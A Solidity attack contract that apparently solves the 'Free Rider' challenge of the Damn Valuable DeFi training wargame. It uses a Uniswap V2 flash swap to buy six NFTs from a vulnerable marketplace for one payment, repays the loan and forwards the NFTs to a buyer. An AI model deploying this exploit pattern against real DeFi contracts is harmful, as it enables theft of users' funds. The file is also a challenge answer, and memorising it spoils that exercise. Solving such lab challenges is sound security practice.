// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IMarketplace{
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH{
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttack is IERC721Receiver, IUniswapV2Callee {

    IWETH weth;
    IUniswapV2Factory factory;
    IUniswapV2Pair pair;
    IMarketplace market;
    address buyer;
    DamnValuableNFT dvNFT;

    constructor(
        IWETH _weth,
        IUniswapV2Factory _factory,
        IUniswapV2Pair _pair,
        IMarketplace _market,
        address _buyer,
        DamnValuableNFT _dvNFT
    ) {
        weth = _weth;
        factory = _factory;
        pair = _pair;
        market = _market;
        buyer = _buyer;
        dvNFT = _dvNFT;
    }

    function attack(uint256 _amount) external{
        pair.swap(_amount, 0, address(this), "flashSwap");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        
        //unwrap weth
        weth.withdraw(amount0);

        //create array for NFTs
        uint256[] memory NFTs = new uint256[](6);

        for (uint256 i=0; i < 6; i++){
            NFTs[i] = i;
        }

        //buy NFTs
        market.buyMany{value: amount0}(NFTs);

        //calculate flashSwap fees
        uint256 fees = (amount0 * 100301) / 100000;

        //rewrap weth
        weth.deposit{value: fees}();

        //pay back flashSwap
        weth.transfer(msg.sender, fees);

        //transfer NFTs to buyer
        for (uint256 i=0; i < 6; i++){
            dvNFT.safeTransferFrom(address(this), buyer, NFTs[i]);
        }
    }
    
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {          

    return IERC721Receiver.onERC721Received.selector;
    
    }

    receive () external payable {}


}
